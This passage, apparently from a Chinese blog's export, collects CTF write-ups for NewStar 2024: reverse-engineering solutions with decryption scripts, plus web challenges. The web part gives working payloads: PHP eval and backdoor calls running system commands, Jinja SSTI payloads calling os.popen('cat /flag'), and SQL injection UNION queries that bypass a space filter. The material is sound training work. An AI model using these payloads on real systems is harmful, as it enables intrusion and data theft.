*)qword_408A20[0] + 2)，上文中是buffer。  v0 = (DWORD *)qword_408A20[0];//保存指针到v0  result = GetCurrentProcessId();//获取进程ID  *v0 = result;//把进程ID赋值给v0指针，即是为qword_408A20[0]。  return result;&#125;\n这个函数整个逻辑的大概解释，就是父进程执行打开失败的内容，子进程执行打开成功的内容。那么这个函数的逻辑就是父进程把自己的返回地址和另一个返回地址映射到内存中，然后被子进程替换，从而使父进程的返回地址改变到4201097。加密逻辑已经清楚，但是我们还是不知道总程序的逻辑。接下来我们分析一下这个函数的交叉引用来寻找总逻辑。\n总逻辑\n对sub_401550()引用我们可以找到一个数组__int64 qword_4032A0[];在这个数组中记录了sub_401550()的地址，继续寻找数组的引用，继续往下找我们可以找到sub_401B50()\n\n__int64 sub_401B50()&#123;  void (**v0)(void); // rbx  __int64 *v1; // rsi  unsigned int i; // eax  for ( i = 0; qword_4032A0[i + 1]; ++i )    ;  if ( i )  &#123;    v0 = (void (**)(void))&amp;qword_4032A0[i];    v1 = &amp;qword_4032A0[i - (unsigned __int64)(i - 1) - 1];    do      (*v0--)();    while ( v0 != (void (**)(void))v1 );  &#125;  return sub_401510(loc_401B10);&#125;\n这个函数把qword_4032A0[]数组的指针依次保存到v0执行，包括我们的sub_401550()函数。我们继续往上跟，最终会跟到main函数里面\n这下就真相大白了，在进入main函数时程序也就是父进程，先执行了sub_401550()，因为没有创建映射对象所以会走打开失败的分支，然后创建映射对象，并映射内存，把上述的数据写入内存。接下来执行到输入的函数sub_4017A9()，创建子进程(创建的子进程与父程序是相同文件)并等待子进程的结束。这期间子进程因为有了父进程的创建映射对象，子进程会走成功打开的分支，修改父进程的返回地址，从而改变程序的执行逻辑，我们找到最终执行的位置，发现真正的加密方法。\n那么接下来就是对最后的加密进行分析了，我们来到0x401A89处，也就是父进程返回被修改后到的函数。但是我们发现一个问题，这里是一大堆字节码，我们c键恢复成代码后勉强可以看到汇编，不能反编译。\n.text:0000000000401A90 loc_401A90:                             ; CODE XREF: .text:0000000000401B00↓j.text:0000000000401A90                 movsx   eax, bl.text:0000000000401A93.text:0000000000401A93 loc_401A93:                             ; CODE XREF: .text:0000000000401A69↑j.text:0000000000401A93                 mov     edx, 41 .text:0000000000401A98                 sub     edx, eax ;41减去下标.text:0000000000401A9A                 mov     eax, edx.text:0000000000401A9C                 lea     rdx, byte_408A40.text:0000000000401AA3                 cdqe.text:0000000000401AA5                 movzx   r8d, byte ptr [rdx+rax].text:0000000000401AAA                 movsx   eax, bl.text:0000000000401AAD                 lea     ecx, [rax+rax]  ;下标的2倍.text:0000000000401AB0                 mov     edx, 818089009.text:0000000000401AB5                 mov     eax, ecx.text:0000000000401AB7                 imul    edx.text:0000000000401AB9                 sar     edx, 3.text:0000000000401ABC                 mov     eax, ecx.text:0000000000401ABE                 sar     eax, 31.text:0000000000401AC1                 sub     edx, eax.text:0000000000401AC3                 mov     eax, edx.text:0000000000401AC5                 imul    eax, 42.text:0000000000401AC8                 sub     ecx, eax.text:0000000000401ACA                 mov     eax, ecx.text:0000000000401ACC                 lea     rdx, byte_408A40.text:0000000000401AD3                 cdqe.text:0000000000401AD5                 movzx   edx, byte ptr [rdx+rax] ;input[(2*i)%42].text:0000000000401AD9                 movsx   eax, bl.text:0000000000401ADC                 mov     ecx, 41.text:0000000000401AE1                 sub     ecx, eax.text:0000000000401AE3                 mov     eax, ecx.text:0000000000401AE5                 mov     ecx, r8d  ;获取input[41-i].text:0000000000401AE8                 xor     ecx, edx  ;异或.text:0000000000401AEA                 lea     rdx, byte_408A40.text:0000000000401AF1                 cdqe.text:0000000000401AF3                 mov     [rdx+rax], cl.text:0000000000401AF6                 mov     eax, ebx.text:0000000000401AF8                 add     eax, 1.text:0000000000401AFB                 mov     ebx, eax.text:0000000000401AFD                 cmp     bl, 29h ;比较是判断否加密完毕.text:0000000000401B00                 jle     short loc_401A90.text:0000000000401B02                 jmp     loc_4019F9\n其实这里可以借助动调分析。但是这个题是有反调试的，在上面的sub_401550()函数中，要子进程调试父进程，如果在这之前父进程被其他进程调试了，子进程就无法附加调试，那自然无法执行正确的逻辑。我们已经知道子程序的逻辑就是修改父进程的返回地址，我们可以手动修改。在retn处下断点，然后修改EIP的值为0x401A89；这样就可以直接跳到加密部分分析了。这里我们经过短暂（雾）的分析汇编盯针出主要的加密逻辑。\nfor (int i = 0; i &lt; 42; i++) &#123;    input[41 - i] ^= input[(2* i)%42];&#125;\n写出解密脚本\n#include &lt;stdio.h&gt;int main() &#123;    unsigned char mm[42] = &#123;    0x34, 0x6C, 0x60, 0x33, 0x15, 0x3B, 0x74, 0x38, 0x5E, 0x6A, 0x53, 0x05, 0x31, 0x1C, 0x43, 0x35,    0x53, 0x58, 0x4A, 0x12, 0x39, 0x3B, 0x35, 0x5E, 0x3A, 0x21, 0x08, 0x1B, 0x44, 0x00, 0x7C, 0x26,    0x6E, 0x5D, 0x54, 0x0C, 0x01, 0x07, 0x00, 0x1F, 0x52, 0x1B    &#125;;        for (int i = 41; i&gt;=0; i--) &#123;        mm[41-i] ^= mm[(2 * i) % 42];        printf(&quot;%c&quot;, mm[41-i]);    &#125;  &#125;//flag&#123;G00d_jOb_!_7h1s_i5_nOt_0nIy_junkc0d3&#125;","categories":["WriteUp"],"tags":["re,WriteUp"]},{"title":"2024CtfNewStar Week2 Re&Web-wp","url":"/2024/10/26/CtfNewStar-Week2-wp/","content":"Reverse(✿･ω･)&#x2F;原题\ndrink_tea查壳后丢进ida，在main函数中发现加密函数，密钥和加密后的密文。分析加密函数，发现tea加密的特征deltea值，于是把密钥的值按d变为dd形式的数据，拿到4个密钥，然后提取出密文写脚本解密，把加密过程反过来就行。脚本如下。  \n#include &lt;stdio.h&gt;int __fastcall dec(unsigned int* input, unsigned int* key_1);int main() &#123;   unsigned char m[32] = &#123;        0x78, 0x20, 0xF7, 0xB3, 0xC5, 0x42, 0xCE, 0xDA,        0x85, 0x59, 0x21, 0x1A, 0x26, 0x56, 0x5A, 0x59,        0x29, 0x02, 0x0D, 0xED, 0x07, 0xA8, 0xB9, 0xEE,        0x36, 0x59, 0x11, 0x87, 0xFD, 0x5C, 0x23, 0x24    &#125;;    unsigned int key[4] = &#123;0x636C6557, 0x54656D6F, 0x77654E6F, 0x72617453&#125;;     for (int i = 0; i &lt; 32; i += 8) &#123;        dec((unsigned int*)&amp;m[i],key);    &#125;    for (int i = 0; i &lt; 32; i++) &#123;        printf(&quot;%c&quot;, m[i]);     &#125;    return 0;&#125;int __fastcall dec(unsigned int* input, unsigned int* key_1)&#123;    __int64 result;     unsigned int input2;     unsigned int input_add2;     int delta; unsigned int i;     input2 = *input;    input_add2 = input[1];    delta = -1640531527 * 32;    for (i = 0; i &lt; 0x20; ++i)    &#123;        input_add2 -= (key_1[3] + (input2 &gt;&gt; 5)) ^ (delta + input2) ^ (key_1[2] + 16 * input2);        input2 -= (key_1[1] + (input_add2 &gt;&gt; 5)) ^ (delta + input_add2) ^ (*key_1 + 16 * input_add2);        delta += 1640531527;     &#125;    *input = input2;    input[1] = input_add2;    return 0;&#125;  \n\n\nDirty_flowers查壳后丢进ida32，提示花指令。发现有两处爆红，发现是以call和ret构造的花指令，直接nop掉，在函数入口处按u后再按p，就可以编译了。在main函数中发现了加密函数和key，于是直接写脚本解密。脚本如下（不知道为什么编译器识别密钥有13位，其实数下来就12位），输出结果就是flag\n#include &lt;stdio.h&gt;int main() &#123;\tint v3[36] = &#123; 0 &#125;;\tv3[0] = 2;\tv3[1] = 5;\tv3[2] = 19;\tv3[3] = 19;\tv3[4] = 2;\tv3[5] = 30;\tv3[6] = 83;\tv3[7] = 31;\tv3[8] = 92;\tv3[9] = 26;\tv3[10] = 39;\tv3[11] = 67;\tv3[12] = 29;\tv3[13] = 54;\tv3[14] = 67;\tv3[15] = 7;\tv3[16] = 38;\tv3[17] = 45;\tv3[18] = 85;\tv3[19] = 13;\tv3[20] = 3;\tv3[21] = 27;\tv3[22] = 28;\tv3[23] = 45;\tv3[24] = 2;\tv3[25] = 28;\tv3[26] = 28;\tv3[27] = 48;\tv3[28] = 56;\tv3[29] = 50;\tv3[30] = 85;\tv3[31] = 2;\tv3[32] = 27;\tv3[33] = 22;\tv3[34] = 84;\tv3[35] = 15;\tchar key[] = &quot;dirty_flower&quot;;\tint len = 12;\tfor (int i = 0; i &lt; 36; i++)\t&#123;\t\tint a = i % len;\t\tv3[i] ^= key[a];\t&#125;\tfor (int i = 0; i &lt; 36; i++) &#123;\t\tprintf(&quot;%c&quot;, v3[i]);\t&#125;&#125;\n\nUPX用die查看发现带壳，于是用upx脱壳，丢入ida,发现RC4加密函数。还有密钥，发现密文data为空，于是用linux进行调试，在比较处断点，发现data的值，这样就得到了密文。想了一下决定用网站进行解密，于是把密钥先转化成十进制（脚本如下），把输出结果用https://gs.jisuanla.com/decimal-to-ascii.html转化为ascii码，然后进行base64编码，最后用在线网站进行解密https://www.mklab.cn/utils/rc4。  \nflag{Do_you_know_UPX?}  \n#include&lt;stdio.h&gt;int main() &#123;    unsigned char data[23] = &#123;    0xC4, 0x60, 0xAF, 0xB9, 0xE3, 0xFF, 0x2E, 0x9B, 0xF5, 0x10, 0x56, 0x51, 0x6E, 0xEE, 0x5F, 0x7D,    0x7D, 0x6E, 0x2B, 0x9C, 0x75, 0xB5 &#125;;               for (int i = 0; i &lt; 22; i++) &#123;        printf(&quot;%d,&quot;, data[i]);    &#125;    &#125;\n\nEzencrypt先找到main函数，发现里面对输入得数据进行了加密。仔细分析，明文tx被Enc函数加密，然后调用enc中得check方法对密文进行检验。在Enc中我们发现明文先是被AES加密再用base64编码，然后在调用check时，加密后的密文又被传入一个位于native的doEncCheck的函数中。所以提取so文件在ida中查看。在ida中我们发现了doEncCheck函数，但是它先调用了一个enc函数与密钥进行了简单的异或，然后enc函数最后又调用了一个encc函数，分析encc函数发现类似于RC4加密，密钥与enc相同，最后再由doEncCheck函数把加密后的密文与正确的密文进行比对返回结果。所以解密顺序就是先解密encc然后是enc再是AES，脚本如下，输出的是被base64编码的被AES加密的密。进行AES解密，能看到密钥被放在了MainActivity.title里面，用(https://www.mklab.cn/utils/aes)进行解密，得到结果就是flag。  \nflag{0hh_U_kn0w_7h15_5ki11}\n#include &lt;stdio.h&gt;const char* init_sbox(const char* key);unsigned long encc(char* key, char* input);__int64 __fastcall enc(char* input);unsigned char sbox[256];unsigned char key[4] = &quot;meow&quot;;int main() &#123;        unsigned char input[] = &#123; 0xC2, 0x6C, 0x73, 0xF4, 0x3A, 0x45, 0x0E, 0xBA, 0x47, 0x81, 0x2A, 0x26, 0xF6, 0x79, 0x60, 0x78,    0xB3, 0x64, 0x6D, 0xDC, 0xC9, 0x04, 0x32, 0x3B, 0x9F, 0x32, 0x95, 0x60, 0xEE, 0x82, 0x97, 0xE7,    0xCA, 0x3D, 0xAA, 0x95, 0x76, 0xC5, 0x9B, 0x1D, 0x89, 0xDB, 0x98, 0x5D &#125;;        init_sbox(key);    encc(key, input);    enc(input);    for (int i = 0; i &lt; 44; i++) &#123;        printf(&quot;%c&quot;, input[i]);    &#125;&#125;__int64 __fastcall enc(char* input)&#123;    signed int i; // [xsp+0h] [xbp-20h]    signed int v3; // [xsp+4h] [xbp-1Ch]    v3 = 44;    for (i = 0; i &lt; v3; ++i)        input[i] ^= key[i % 4];    return 0;&#125;const char* init_sbox(const char* key) &#123;    int v1;                     unsigned int v2 = 0;         unsigned int v3 = 0;         unsigned int i, j;           size_t key_length;          key_length = strlen(key);    for (i = 0; i &lt; 256; ++i) &#123;        sbox[i] = i;    &#125;    for (j = 0; j &lt; 256; ++j) &#123;        v1 = sbox[j];        v3 = (v3 + v1 + (unsigned char)key[v2]) % 256;        sbox[j] = sbox[v3];        sbox[v3] = v1;        ++v2;        if (v2 &gt;= key_length) &#123;            v2 = 0;        &#125;    &#125;    return key;&#125;unsigned long encc(char* key, char* input) &#123;    unsigned long result;    unsigned char v3;    int v4 = 0;    int v5 = 0;    int i;    result = 44;    for (i = 0; i &lt; result; ++i) &#123;        v5 = (v5 + 1) % 256;        v4 = (v4 + sbox[v5]) % 256;        v3 = sbox[v5];        sbox[v5] = sbox[v4];        sbox[v4] = v3;        input[i] ^= sbox[(sbox[v5] + sbox[v4]) % 256];    &#125;    return result;&#125;\n\nPangbai泰拉记（1）Die查壳后丢入ida，看到了一堆混淆，f5查看main函数，分析一下看到提示用调试获得flag，还发现flag与key进行了异或，看了下key和flag的值后直接启动调试，此时再看key的值发生了变化，而flag的值也是假的，尝试用没调试时的key解flag，发现也是不行。想了一下，可能是调试状态的改变使flag和key的值不正确（main函数前面有个检测调试，虽然改变变量的函数没在main里被调用，但是在main函数执行前还有许多的函数会先被调用），所以看异或前两个的值，发现flag的值不变，但是key的值是已经变化了，于是按x找到调用key的函数。发现key在一个main0的函数中被进行了异或操作，在if判断了是否为调试之类的，然后把key与的两种不同的值进行异或。于是在if的jz处下断点，调试到这里发现ZF的值为0，输出的就是一开始调试的key，所以我们改变ZF的值为1，让key为正确的密钥。此时在主函数的结束处下断点便于查看flag的值，运行到此直接查看flag的值，按a转为字符串，这就是真的flag了。\n\nPtrace题目提示ptrace，发现了father和son两个文件，die查了后用ida分析。先看father，在main函数中我们发现，他先是创建了一个子进程，然后根据fork函数的特性，子进程打开了名为son的可执行文件，而父进程则监控着子进程，并对子进程传入了一个为3的参数，而后父进程就等待子进程的执行完成，程序结束。在子进程中我们发现了一个加密函数，把我们输入的s进行了|运算，并与mm判断是否相等。这时的我们拿到了密文和加密方法，所以直接写脚本解密就行,注意偏移的值是父进程传入的3(猜的)，脚本如下，输出的结果就是flagflag{Do_you_really_know_ptrace?}\n#include &lt;stdio.h&gt;unsigned char m[32] = &#123; 0xCC, 0x8D, 0x2C, 0xEC, 0x6F, 0x88, 0xED, 0xEB, 0x2F, 0xED, 0xAE, 0xEB, 0x4E, 0xAC, 0x2C, 0x8D, 0x8D, 0x2F, 0xEB, 0x6D, 0xCD, 0xED, 0xEE, 0xEB, 0x0E, 0x8E, 0x4E, 0x2C, 0x6C, 0xAC, 0xE7, 0xAF &#125;;void dec(const unsigned char* m, unsigned char* flag) &#123;    for (int i = 0; i &lt; 32; ++i) &#123;        flag[i] = (m[i] &lt;&lt; 3) | (m[i] &gt;&gt; (8 - 3));    &#125;&#125;int main() &#123;    unsigned char flag[32];    dec(m, flag);    printf(&quot;%s&quot;, flag);    return 0;&#125;\n\nWeb你能在一秒内打出八句英文吗开始是先想着用brup抓时间点的包进行post的，查看了源码后发现它记录的是开始的时间戳，而且一些快捷键被禁用了。所以没有办法只能让虫虫来帮我完成这次任务了。虫虫就在下面。Url1就是开始的页面，url2是在源码中发现的提交时post内容的页面。同时发现提交时的cookie记录了时间戳，所以cookie也要传递到url2。然后在查看源码后定位要输入的英文的位置，获取并以post的方式提交给url2。运行后就可以得到flag。\nimport requestsfrom bs4 import BeautifulSoupurl1 = &#x27;....../start&#x27;url2 = &#x27;....../submit&#x27;import requestsfrom bs4 import BeautifulSoupwith requests.Session() as session:    response1 = session.get(url1)    soup = BeautifulSoup(response1.text, &#x27;html.parser&#x27;)    container_div = soup.find(&#x27;div&#x27;, &#123;&#x27;class&#x27;: &#x27;container&#x27;&#125;)    text_p = container_div.find(&#x27;p&#x27;, &#123;&#x27;id&#x27;: &#x27;text&#x27;&#125;)    text_content = text_p.text.strip()    post_data = &#123;        &#x27;user_input&#x27;: text_content,    &#125;    response2 = session.post(url2, data=post_data)    print(response2.status_code)\n\n遗失的拉链提示找东西，源代码和请求头看了都没收获，尝试目录扫描，在linux进行扫描，发现网站备份文件www.zip，直接输入下载到本地，发现有个pizwww.php的文件转到pizwww.php目录下，按照下载的php文件进行传参，要求我们get一个new的参数和post一个star的参数，要求两个数据不相等但是shal和MD5强相等，直接数组绕过，然后再post参数给cmd让eval()函数执行，同时发现cmd被过滤了flag和cat。不过先执行ls &#x2F;看一下flag的位置，&#x2F;pizwww.php/?new[]=2121，POST star[]&#x3D;adssds&amp;cmd&#x3D;system(“ls &#x2F;“);，发现一个flag的文件，想到用tac作为读取命令，用f进行读取POST star[]&#x3D;adssds&amp;cmd&#x3D;system(“tac &#x2F;f“);直接拿到flag。flag{e1b4e109-b24e-4301-b4a0-473153f473c0}\n\npangbai过家家(2)根据剧情得到提示“泄露”，推测是git泄露，于是先用dirsearch扫描目录，发现了许多git文件，确定是git泄露，于是用githack获取git文件。在目录里也没看到什么东西，git log一下也没看出什么，后面想想直接恢复历史版本看一下有没有不同的文件，执行git stash pop，发现有一个叫 BacKd0or.v2d23AOPpDfEW5Ca.php的文件非常可疑于是把这个文件恢复过来看看。dit add BacKd0or.v2d23AOPpDfEW5Ca.php。打开文件发现这就是剧情中的后门，分析代码，发现需要我们POST一个papa的为TfflxoU0ry7c，后再get一个NewStar_CTF.2024的值不能为Welcome但是正则匹配又要是Welcome，这里想到用换行符进行绕过，同时还要注意因为php的传参规则会把.这类符号转换为下划线导致传参错误，但是在存在”[“时，php只会把”[“转化为”_”，而后面的并不变，所以我们要把第一个下划线改成”[“。在满足上面条件后我们就可以给call_user_func()函数POST两个参数分别是func为要执行的函数名，arry为函数的参数，这里想到system函数来执行linux系统命令。刚开始用ls查看文件硬是没有找到flag。后来问学长得知flag还可能藏在环境变量里于用env查看环境变量，flag就在里面。最终传参：&#x2F;BacKd0or.v2d23AOPpDfEW5Ca.php&#x2F;?NewStar[CTF.2024&#x3D;Welcome%0aPOST papa&#x3D;TfflxoU0ry7c&amp;func&#x3D;system&amp;args&#x3D;envflag{528f729b-f0c2-4089-86d5-af868a1b736d}\n\n复读机!一开始真不知道这是啥玩意，看了官方参考文档，发现是SSTI，尝试输入2，得到2的结果，到此确定是ssti.于是在网上了解了一下并找了一些用内敛函数构成的可以执行系统命令的playload。  \n&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[142].__init__.__globals__[request.args.arg1](request.args.arg2).read()&#125;&#125;&amp;arg1=popen&amp;arg2=ls\n像上面这类的命令好像被过滤了，提示bot不喜欢上课，推测是class不能有，所以去找一下不带class的playload。最后发现\n&#123;&#123;url_for.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;最简洁好用，先寻找flag的位置，发现就在/目录下，于是直接cat /flag。  \n最终playload: \n&#123;&#123;url_for.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()&#125;&#125;\n\n\n谢谢皮蛋plus先用or来查看包裹数据的情况，输入1可以查询到内容，于是输入-1 or 1 &#x3D;1;#,发现有字符触发了过滤于是用||代替or，还是不行推测可能是空格，所以输入了1 1，发现被过滤，确定就是空格，想到用&#x2F;&#x2F;代替空格，但是手动输入有点麻烦于是写了个脚本把空格转换为&#x2F;&#x2F;(脚本如下)，于是输入-1&#x2F;&#x2F;or&#x2F;&#x2F;1&#x3D;1;#，发现没有回显结果（估计是没有报错显示），后输入-1”&#x2F;&#x2F;or&#x2F;&#x2F;1&#x3D;1;#，发现可以正常查询到结果了，根据返回的两个值看推测查询的是两个列的内容。于是基于此构造联合查询，\n-1&quot;/**/UNION/**/SELECT/**/1,GROUP_CONCAT(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/TABLE_SCHEMA=database();#\n查到Fl4g的表名\n-1”/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns;#\n查到列名根据week1的思路估计又在value里面，所以直接输入\n-1&quot;/**/union/**/select/**/1,value/**/from/**/Fl4g;#\n得到的就是flag\ndef replace(str):    pstr = str.replace(&quot; &quot;, &quot;/**/&quot;)    return pstrstr = &quot;&quot;   #输入字符串pstr = replace(str)print(pstr)\n\n","categories":["WriteUp"],"tags":["re,WriteUp"]},{"title":"2024CtfNewStar Week4 Re-wp","url":"/2024/11/07/CTFNewStar2024-Week4-wp/","content":"Reverse(・∀・)つ原题 \nMazE在main函数里找到加密逻辑，父子进程进行用v12和pipedes管道通信。根据分析依次找到函数getmap用于获取地图getbin获取二进制值到显示的3X3地图dec用于获取获取当前坐标的二进制值dec1从被压缩解密的迷宫地图中获取当前坐标对应的char字符后面的位移运算用于提取出当前位置的二进制值对地图进行解密，简单的异或，那么omap就是被压缩的地图最后进行MD5加密即可用脚本解密脚本如下\n#include &lt;stdio.h&gt;unsigned char omap[1226] = &#123;    ...&#125;;unsigned int map[99][99];unsigned char getmap(unsigned char* omap, int index) &#123;    unsigned char key[] = &quot;tgrddf55&quot;;    return omap[index] ^ key[index % 8];&#125;unsigned int getbin(int x,int y, unsigned char *omap) &#123;    int index1,index2;    unsigned int tmpmap,bin;    index1 = (99 * x + y) / 8;    tmpmap = getmap(omap, index1);    bin = tmpmap &gt;&gt; (7 - (99 * x + y) % 8) &amp; 1;    return bin;&#125;int main() &#123;    for (int x = 0; x &lt; 99; x++) &#123;        for (int y = 0; y &lt; 99; y++) &#123;            map[x][y] = getbin(x, y, omap);            printf(&quot;%d,&quot;, map[x][y]);        &#125;    &#125;\treturn 0;&#125;\n//在官方那里搜刮的脚本#include &lt;iostream&gt;using namespace std;int Map[] = &#123; 1,1,1,1,1,1,1,1,1,1,1,1,...&#125;int map[99][99];char t[10000];int r = 0;int dx[4] = &#123; -1, 0, 1, 0 &#125;;int dy[4] = &#123; 0, 1, 0, -1 &#125;;char op[4] = &#123; &#x27;w&#x27;, &#x27;d&#x27;, &#x27;s&#x27;, &#x27;a&#x27; &#125;;bool check(int qx, int qy) &#123;    if (qx &gt;= 0 &amp;&amp; qx &lt; 99 &amp;&amp; qy &gt;= 0 &amp;&amp; qy &lt; 99) &#123;        if (map[qx][qy] == 0) return 1;    &#125;    return 0;&#125;void dfs(int x, int y) &#123;    // printf(&quot;%d %d\\n&quot;,x,y);    if (x == 97 &amp;&amp; y == 97) &#123;        // printf(&quot;yes!&quot;);        for (int i = 0; i &lt; r; i++) cout &lt;&lt; t[i];        cout &lt;&lt; endl;        cout &lt;&lt; r;        cout &lt;&lt; endl;        return;    &#125;    for (int i = 0; i &lt; 4; i++) &#123;        int qx = dx[i] + x;        int qy = dy[i] + y;        if (check(qx, qy)) &#123;            t[r] = op[i];            r++;            map[x][y] = 1;            dfs(qx, qy);            map[x][y] = 0;            r--;            t[r] = 0;        &#125;    &#125;&#125;int main() &#123;    for (int i = 0; i &lt; 99; i++) &#123;        for (int j = 0; j &lt; 99; j++) &#123;            map[i][j] = Map[99 * i + j];        &#125;    &#125;    dfs(1, 1);    return 0;&#125;\n\n洞OVO看提示，函数的修改之处是新增了3行汇编代码，想到用bindffi对比分析，去网上查找资料，发现修复版本是6.23，于是下载安装6.23然后提取出WinRAR.exe.与附件中的进行对比.想先猜猜看，以相似度排序就在第二个相似度为0.99的sub_1400EF508函数发现了不同刚好是三行汇编，于是直接输入函数的地址flag{00000001400EF508}\n\nEasygui先查看winmain函数，发现窗口在收到输入的数据时会调用WndClass.lpfnWndProc方法，然后调用加密函数，分析第一层加密函数，最上面是一个反调试的检测，下面调用了真正的加密函数，后面是把密文逐一对比判断，很显然这就是密文，手动提取下来。分析真正的加密函数，首先是把输入的值赋给了src，然后以src的元素作为下标在初始盒中映射，然后把src进行位运算，后面再初始化一个ascii的码表盒，进行rc4加密。那么解密思路就是，先进行rc4解密，然后反向进行位运算，再把元素与初始盒映射为下标。Tips：提取初始盒注意顺序，显示的顺序不一定是索引顺序。这里key的使用在ida中的代码让人疑惑，因为他存储的位置是src的长度之外，推测是存到了别的内存，于是进行动调，先在if ( !IsDebuggerPresent() )的jz处下断点，然后修改zf的值跳过反调试，然后观察src的值，发现末尾就是一大串key的值，看了一下其他的数组，发现就是v13的值，所以key被存到了v13里，这里我直接ida提取出来了。按思路解密就行，脚本如下。\n#include &lt;stdio.h&gt;void dealboxdec(unsigned char* Src, unsigned char* box, int len) &#123;    unsigned _int16 v11;    for (int k = 0; k &lt; len; k += 4) &#123;        v11 = Src[k + 3];                Src[k + 3] = (Src[k + 3] &lt;&lt; 3) | (Src[k + 0] &gt;&gt; 5);        Src[k + 0] = (Src[k + 0] &lt;&lt; 3) | (Src[k + 1] &gt;&gt; 5);        Src[k + 1] = (Src[k + 1] &lt;&lt; 3) | (Src[k + 2] &gt;&gt; 5);        Src[k + 2] = (Src[k + 2] &lt;&lt; 3) | (v11 &gt;&gt; 5);    &#125;    for (int j = 0; j &lt; 44; ++j) &#123;        for (int i = 0; i &lt; 256; i++) &#123;            if (box[i] == Src[j]) &#123;                Src[j] = i;                break;            &#125;        &#125;    &#125;&#125;void dec1(char *key,unsigned char *box, unsigned char *Src) &#123;    int i = 0;    do    &#123;        box[i] = i;        ++i;    &#125; while (i &lt; 256);    &#125;void dec2(unsigned char* box) &#123;    int v21,v22,v17,v18,v16;    char* v23;    unsigned __int64 result;    unsigned char v31[256] = &#123;     0x65, 0x61, 0x73, 0x79, 0x5F, 0x47, 0x55, 0x49, 0x65, 0x61, 0x73, 0x79, 0x5F, 0x47, 0x55, 0x49,     0x65, 0x61, 0x73, 0x79, 0x5F, 0x47, 0x55, 0x49, 0x65, 0x61, 0x73, 0x79, 0x5F, 0x47, 0x55, 0x49,     0x65, 0x61, 0x73, 0x79, 0x5F, 0x47, 0x55, 0x49, 0x65, 0x61, 0x73, 0x79, 0x5F, 0x47, 0x55, 0x49,  //v13实际是key的填充，动调提取出来的     0x65, 0x61, 0x73, 0x79, 0x5F, 0x47, 0x55, 0x49, 0x65, 0x61, 0x73, 0x79, 0x5F, 0x47, 0x55, 0x49,     0x65, 0x61, 0x73, 0x79, 0x5F, 0x47, 0x55, 0x49, 0x65, 0x61, 0x73, 0x79, 0x5F, 0x47, 0x55, 0x49,     0x65, 0x61, 0x73, 0x79, 0x5F, 0x47, 0x55, 0x49, 0x65, 0x61, 0x73, 0x79, 0x5F, 0x47, 0x55, 0x49,     0x65, 0x61, 0x73, 0x79, 0x5F, 0x47, 0x55, 0x49, 0x65, 0x61, 0x73, 0x79, 0x5F, 0x47, 0x55, 0x49,     0x65, 0x61, 0x73, 0x79, 0x5F, 0x47, 0x55, 0x49, 0x65, 0x61, 0x73, 0x79, 0x5F, 0x47, 0x55, 0x49,     0x65, 0x61, 0x73, 0x79, 0x5F, 0x47, 0x55, 0x49, 0x65, 0x61, 0x73, 0x79, 0x5F, 0x47, 0x55, 0x49,     0x65, 0x61, 0x73, 0x79, 0x5F, 0x47, 0x55, 0x49, 0x65, 0x61, 0x73, 0x79, 0x5F, 0x47, 0x55, 0x49,     0x65, 0x61, 0x73, 0x79, 0x5F, 0x47, 0x55, 0x49, 0x65, 0x61, 0x73, 0x79, 0x5F, 0x47, 0x55, 0x49,     0x65, 0x61, 0x73, 0x79, 0x5F, 0x47, 0x55, 0x49, 0x65, 0x61, 0x73, 0x79, 0x5F, 0x47, 0x55, 0x49,     0x65, 0x61, 0x73, 0x79, 0x5F, 0x47, 0x55, 0x49, 0x65, 0x61, 0x73, 0x79, 0x5F, 0x47, 0x55, 0x49,     0x65, 0x61, 0x73, 0x79, 0x5F, 0x47, 0x55, 0x49, 0x65, 0x61, 0x73, 0x79, 0x5F, 0x47, 0x55, 0x49,     0x65, 0x61, 0x73, 0x79, 0x5F, 0x47, 0x55, 0x49, 0x65, 0x61, 0x73, 0x79, 0x5F, 0x47, 0x55, 0x49,     0x65, 0x61, 0x73, 0x79, 0x5F, 0x47, 0x55, 0x49, 0x65, 0x61, 0x73, 0x79, 0x5F, 0x47, 0x55, 0x49,    &#125;;    v21 = 0;    v16 = 256;    v17 = 0;    do    &#123;        v22 = *((unsigned __int8*)box + v21);        v17 = (v22 + v31[v21] + v17) % 256;        v23 = (char*)box + v17;        result = (unsigned __int8)*v23;        box[v21++] = result;        *v23 = v22;        --v16;    &#125; while (v16);&#125;void dec3(unsigned char* box,unsigned char* Src) &#123;    int v25,v6,v27;    v25 = 0;    int len = 44;    v6 = 0;    for (int m = 0; m &lt; len; ++m)    &#123;        v6 = (v6 + 1) % 256;        v27 = *((unsigned __int8*)box + v6);        v25 = (v27 + v25) % 256;        box[v6] = box[v25];        box[v25] = v27;        Src[m] ^= box[(unsigned _int8)(v27 + box[v6])];    &#125;&#125;void print(unsigned char* data) &#123;    for (int i = 0; i &lt; 44; i++) &#123;        printf(&quot;%c&quot;,data[i]);    &#125;&#125;unsigned char Src[256];char out[256] = &#123;-33,-57,77,20,-63,-20,8,-28,95,63,3,-76,-112,74,-71,-113,-113,-6,113,67,-57,-15,-99,-35,79,-64,18,68,92,-99,-120,54,45,22,29,-19,-68,-17,-69,91,-97,119,-21,88 &#125;;char key[] = &quot;easy_GUI&quot;;  //key被填充到v13，这里v13我是动调提取的int main() &#123;    unsigned char box0[256];    unsigned char box[256] = &#123;    0x31, 0x74, 0x54, 0x20, 0x03, 0x53, 0x78, 0x70, 0x3A, 0x35, 0x65, 0x42, 0x04, 0x6B, 0x1F, 0x43,    0x06, 0x37, 0x00, 0x76, 0x21, 0x08, 0x0B, 0x13, 0x52, 0x4B, 0x2F, 0x1A, 0x59, 0x2C, 0x56, 0x51,    0x7F, 0x3B, 0x0E, 0x05, 0x26, 0x15, 0x25, 0x63, 0x64, 0x7A, 0x3C, 0x29, 0x41, 0x2A, 0x12, 0x17,    0x2E, 0x39, 0x57, 0x3D, 0x66, 0x33, 0x44, 0x6C, 0x6F, 0x47, 0x16, 0x71, 0x5F, 0x1C, 0x14, 0x5A,    0x0C, 0x4F, 0x01, 0x30, 0x1B, 0x68, 0x0F, 0x62, 0x3F, 0x18, 0x69, 0x6D, 0x7E, 0x5D, 0x6A, 0x28,    0x22, 0x5B, 0x55, 0x72, 0x09, 0x5E, 0x02, 0x3E, 0x50, 0x7B, 0x46, 0x45, 0x38, 0x10, 0x48, 0x79,    0x60, 0x36, 0x61, 0x6E, 0x2D, 0x49, 0x7C, 0x2B, 0x34, 